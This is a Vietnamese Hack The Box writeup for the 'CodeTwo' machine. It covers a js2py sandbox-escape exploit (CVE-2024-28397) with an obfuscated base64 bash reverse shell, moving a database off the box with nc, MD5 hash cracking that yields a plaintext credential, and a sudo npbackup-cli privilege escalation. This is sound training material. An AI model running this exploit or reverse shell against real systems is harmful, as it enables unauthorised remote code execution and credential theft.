---
title: HTB CodeTwo
published: 2025-09-03
tags: [HTB, Linux, Easy]
category: Writeups
author: Trohan0x00
description: Writeup about CodePartTwo Machine
draft: false
image: "/assets/post_image/code2.png"
---

# HTB Labs: CodeTwo

## I. User_Flag
Bước ban đầu scan với nmap trước ta được 2 services
![image](https://hackmd.io/_uploads/B10CR8Lqlg.png)
Có vẻ như ssh ta chưa thể khai thác được gì nên giờ ta đến với web server
![image](https://hackmd.io/_uploads/B1SByD85gx.png)
Đây là một plaform giúp người dùng có thể code nhanh `Javascript` với `IDE` online trên máy chủ. Ta có các dir là `/login`, `/register` và `/download`. Ta sẽ thử reg và login một account để xem chức năng.
Sau một lúc tìm hiểu chức năng thì ta có thể tìm thấy lỗ hỏng `SSTI` ở trong `/dashboard` nơi để ta viết code
![image](https://hackmd.io/_uploads/S1lwlvUcxx.png)
Nhưng có vẻ đã bị sandbox, và filter hết tất cả các hàm có thể khai thác nên có lẽ ta cần download source app ở `/download` để có thể tìm thêm thông tin
![image](https://hackmd.io/_uploads/HknVWwU5ll.png)
ta thấy được source dùng thư viện `js2py`. Đây là thư viện giúp ta có thể code được code `Javascript` trong `Python` như đã thấy ở phía web server và đây cũng giải thích lý do vì sao server chạy `Jinja2` lại có thể code `Javascript` 
![image](https://hackmd.io/_uploads/SyU_R2Lclx.png)
Sau một lúc tìm kiếm, ta thấy được một `CVE-2024-28397` của thư viện này và có public poc [ở đây](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape)
Cụ thể lỗ hỏng này cho phép attacker có thẻ `escape` khỏi môi trường `javascript` để có thể `RCE` và thực hiện các lệnh injection ta có được `POC` khai thác và mình sẽ sửa lại một chút để tương thích với bài lab hơn
```javascript 
let cmd = "printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjQvNDQ0NCAwPiYxKQ==|base64 -d|bash"; 
let a = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__;  
let obj = a(a(a,"__class__"), "__base__");  
function findpopen(o) {  
    let result;    for(let i in o.__subclasses__()) {        let item = o.__subclasses__()[i];        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {            return item;        }        if(item.__name__ != "type" && (result = findpopen(item))) {            return result;        }    }}  
let result = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();  
console.log(result);  
result;  
```
Ở `POC` chỉ lệnh `RCE` bình thường nhưng để thuận tiện khai thác mình sẽ thực hiện reverse shell về phía local với payload `(bash -i >& /dev/tcp/10.10.14.66/4444 0>&1)`
![image](https://hackmd.io/_uploads/BkQmTWw5ge.png)
Ta thành công lấy được shell ở local, check dir hiện tại thì đang ở `/home/app/app`, sau một lúc recon thì thấy được một file users.db ở dir `/home/app/app/instance/` có lẽ file này sẽ có thông tin hữu ích để có thể khai thác
Nhưng do shell ở target không có `sqlite3` để đọc dữ liệu nên ta sẽ dùng `nc` để chuyển về local 
![image](https://hackmd.io/_uploads/SyklRWw9xx.png)
Ta thành công get file về và dùng `sqlite3` để check, thấy rằng db có 2 bảng là `code_snippet` và `user`. Check `user` thì thấy các credential của user với `hashed passwd`
![image](https://hackmd.io/_uploads/SkvPkMv9ex.png)
Và ở phần source code ta biết được passwd sẽ được encrypt bằng `MD5` nên ta có thể dùng `John` để crack dễ dàng. Mình sẽ dùng wordlist `rockyou`
![image](https://hackmd.io/_uploads/H1kEGfv5ee.png)
Giờ ta đã có credential hoàn chỉnh `marco:swetangelbabylove` giờ thì có thể login với ssh server và lấy được `user_flag`
![image](https://hackmd.io/_uploads/H13uMMD9le.png)

## II. Root flag

Check với `sudo -l`, ta thấy có một process có thể run với toàn quyền `root` là `/usr/local/bin/npbackup-cli`. 
![image](https://hackmd.io/_uploads/BJ5oGfPcxl.png)
`npbackup-cli (Portable Network Backup Client)` đây là công cụ `CLI` để tạo và quản lý backup, hỗ trợ snapshot, restore, kiểm tra tính toàn vẹn, và housekeeping. Và file config mặc định sẽ là `npbackup.conf` cũng được tìm thấy ngay tại thư mục hiện tại
```config
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: 
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /home/app/app/
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password: 
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      stdin_from_command:
      stdin_filename:
      tags: []
      compression: auto
      use_fs_snapshot: true
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files:
      - excludes/generic_excluded_extensions
      - excludes/generic_excludes
      - excludes/windows_excludes
      - excludes/linux_excludes
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 10 MiB
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
      repo_password_command:
      minimum_backup_age: 1440
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
        ntp_server:
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false
identity:
  machine_id: ${HOSTNAME}__blw0
  machine_group:
global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}
```
Hãy tưởng tượng sẽ thế nào nếu phần config thay vì chỉ backup ở dir là `/home/app/app` thì mình sẽ đổi lại thành `/root`? Vì vốn dĩ khi config target đã cho ta toàn quyền sudo với `npbackup-cli` thì ta có thể thực hiện việc backup toàn bộ thư mục root và sau đó `dump` ra dữ liệu mà ta cần
Và nên lưu ý, do file ban đầu ta không hề được cấp quyền `write` nên ta có thể xóa luôn file config ban đầu và tạo lại một file mới. Sau đó lưu lại bằng `sudo npbackup-cli -c npbackup.conf -b -f`

Giờ thì ta hoàn toàn có thể dump dễ dàng file `root.txt` ra `sudo npbackup-cli -c npbackup.conf -f --dump /root/root.txt`

![image](https://hackmd.io/_uploads/Hk_tvMD5ee.png)


